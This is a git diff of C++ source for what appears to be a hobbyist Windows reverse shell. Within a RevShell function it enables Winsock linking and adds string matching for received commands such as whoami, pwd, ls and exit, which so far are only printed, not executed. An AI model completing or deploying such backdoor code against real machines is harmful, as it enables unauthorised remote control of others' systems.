@@ -13,7 +13,7 @@
 #include <iostream>     //IN/OUT Debug Head. Only to print values to screen.
 
 //LINKED IN CMAKE
-//#pragma comment(lib, "Ws2_32.lib")  //Link win32 lib with program. Winsocket will not work without.
+#pragma comment(lib, "Ws2_32.lib")  //Link win32 lib with program. Winsocket will not work without.
 
 #define DEFAULT_BUFLEN 1024 //Size of bytes sent and received over network.
 
@@ -64,6 +64,24 @@ void RevShell() {
             int results = recv(tcpsock, CommandGiven, DEFAULT_BUFLEN, 0);   //int value of buffer. Recv() returns a message received from a socket.
             std::cout << "Recieved: " << CommandGiven;
             std::cout << "Length of command: " << results << std::endl;
+
+            //Test1
+            if ((strcmp(CommandGiven, "whoami") == 0)) {
+                std::cout << "Parsed: whoami" << std::endl;
+            }
+            else if ((strcmp(CommandGiven, "pwd") == 0)) {
+                std::cout << "Parsed: pwd" << std::endl;
+            }
+            else if ((strcmp(CommandGiven, "ls") == 0)) {
+                std::cout << "Parsed: ls" << std::endl;
+            }
+            else if ((strcmp(CommandGiven, "exit") == 0)) {
+                std::cout << "Parsed: exit" << std::endl;
+                std::cout << "Ending connections..." << std::endl;
+            }
+            else {
+                std::cout << "Command not parsed..." << std::endl;
+            }
             memset(CommandGiven, 0, sizeof(CommandGiven));      //Resets command buffer.
         }
     }
